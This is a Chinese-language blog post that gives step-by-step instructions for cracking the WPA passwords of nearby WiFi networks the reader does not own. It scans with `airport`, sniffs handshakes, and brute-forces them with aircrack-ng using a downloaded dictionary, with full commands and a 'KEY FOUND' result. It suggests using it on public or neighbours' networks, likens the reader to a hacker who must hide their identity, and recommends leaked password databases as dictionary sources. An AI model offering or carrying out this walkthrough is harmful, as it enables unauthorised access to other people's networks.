---
layout: post
title: 使用 Aircrack-ng 破解 WiFi 密码
category: Document
tags: wifi crack
date: 2021-03-26 16:03:39
published: true
summary: 到一个地方有 WiFi 但不知道密码，如何获得 WiFi 密码呢？PS：去它的万能钥匙
image: pirates.svg
comment: true
---

刚入手 Mac 没多久，但基于 FreeBCD 的 Mac 系统兼容 Unix 命令加上 brew 工具的加持也兼容绝大部分的 linux 命令。好用的用户交互 + 对码农超友好的 Terminal，很完美！所以就爱不释手了，经常随包携带到处码代码（也就码农的命吧）。这么一得瑟就出问题了，外出无网啊，这不，发现个工具居然很轻松的就得到了大部分的 WiFi 密码（可能会不道德啊，建议大家对公共 WiFi 使用，对邻居家偷网的后果自负）

闲话少说，言归正传！

## 保护好自己

进入暗网的第一课就是：“藏好了，不要暴露自己”，有点「黑暗森林」的意思。这适用于网络中的法外之徒——黑客，所以在网络中想干点暗黑事，必须学会隐藏真身，用分身、傀儡去干活，还要学会为他们擦屁股，毕竟养一个分身或傀儡也不容易，丢了坏可惜的。

网络世界中 Mac 地址（网卡号）相当于你现实中的身份证，ip 地址相当于手机号。做攻防的时候这两个东东必须要隐藏好，不能被发现。隐藏的方法有很多，常见的有……（扯多了，咱也不干啥违法的事）。

话说最简单的方式是用虚拟机，虚拟机跟炼制分身一样，起不到保护身份的目的，但别人攻击你的时候，额，最坏的情况也就是把分身干躺，死一个分身而已可以接受的。

炼制分身的法器有 Virtual Box, VMWare，Hyper-V 等，在各自系统上安装法器，找到分身镜像（Ubuntu, Kali, Arch, bulabula）即可炼制，我喜欢小的，mini 的，老子就想用几个命令而已装个 Ubuntu 干鸟啊，所以我喜欢装 alpine，小巧，嗖的一下就完事（关键硬盘小啊，128G，😭）

## 扫描 scan

首先要知道想破解哪个 WiFi，要获得这个 WiFi 的一些信息才能精准的嗅探到需要破解时用到的数据。

MAC 系统有个很好用的 WiFi（802.11） 接口工具：airport，使用 `airport -s` 即可扫描所有可见的无线网络：

```bash
$ airport -s
                            SSID BSSID             RSSI CHANNEL HT CC SECURITY (auth/unicast/group)
                 xxxxxx_xxxxxxxx xx:xx:xx:xx:xx:xx -36  5       Y  CN WPA(PSK/TKIP,AES/TKIP) WPA2(PSK/TKIP,AES/TKIP)
                             xxx xx:xx:xx:xx:xx:xx -51  1       Y  CN WPA2(802.1x/AES/AES)
                          shuiwo xx:xx:xx:xx:xx:xx -57  1       Y  CN WPA2(PSK/AES/AES)
```

SSID: WiFi 名称
BSSID: 站点 MAC 地址
RSSI: 信号轻度，绝对值越小越强
CHANNEL: 信道
SECURITY: 加密方式

## 嗅探 sniff

使用 `airport sniff [CHANNEL]` 即可对 WiFi 信道抓包，之后会生成 .cap 文件，再之后可用 aircrack.ng 等工具进行暴力破解。

```bash
$ sudo airport sniff 1
```

嗅探时间看情况而定，最好嗅探的时候有人连接过目标 WiFi。

生成了 airportSniffXXXXXXX.cap 文件

## 密码字典

密码字典是加速暴力破解密码时的不二法门，去哪搞到好的密码字典，github 上搜去吧（另外之前某些大公司泄的漏数据库里面可是有海量的明文密码的）。这个[项目](https://github.com/TheKingOfDuck/fuzzDicts.git)，里面的字典大大地好用！

这里用的字典文件是：pwddct.txt

## 破解工具登场

有许多好的工具都可用来暴力破解，牛逼一点的人会自己写不用别人写的，尤其有网络通信的工具。

这里我们用 aircrack-ng，用法如下`aircrack-ng -w pwddct.txt airportSniffXXXXXXX.cap·文件`，该命令首先会解析通讯包，然后从其中找出有握手的包的序号给它让它用字典暴力破解就行了。

```bash
$ aircrack-ng -w pwddct.txt airportSniffXXXXXXX.cap

Reading packets, please wait...
Opening airportSniffwghS1w.cap
[0KRead 187668 packets.

   #  BSSID              ESSID                     Encryption

1033  xx:xx:xx:xx:xx:xx                            WPA (0 handshake)
1034  xx:xx:xx:xx:xx:xx                            WEP (3 IVs)
1035  xx:xx:xx:xx:xx:xx                            WPA (0 handshake)
1036  xx:xx:xx:xx:xx:xx  shuiwo                    WPA (1 handshake)
1037  xx:xx:xx:xx:xx:xx  xxxx xxxxxx               WPA (0 handshake)
1038  xx:xx:xx:xx:xx:xx  xxxxxxxxx-xxxx            Unknown
1039  xx:xx:xx:xx:xx:xx                            WPA (0 handshake)
1040  xx:xx:xx:xx:xx:xx  xx??x%??x!?!x??Sxx?x?'x   Unknown
1041  xx:xx:xx:xx:xx:xx  shuiwo                    WEP (1 IVs)

Index number of target network ? 1036

                              Aircrack-ng 1.6

      [00:00:21] 96329/96807 keys tested (4490.17 k/s)

      Time left: 0 seconds                                      99.51%

                           KEY FOUND! [ 12345678 ]


      Master Key     : xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx
                       xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx

      Transient Key  : xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx
                       xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx
                       xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx
                       xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx

      EAPOL HMAC     : xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx
```

还好，密码简单很快就破解了！

TODO:

- Linux 的扫描和嗅探有时间再补吧
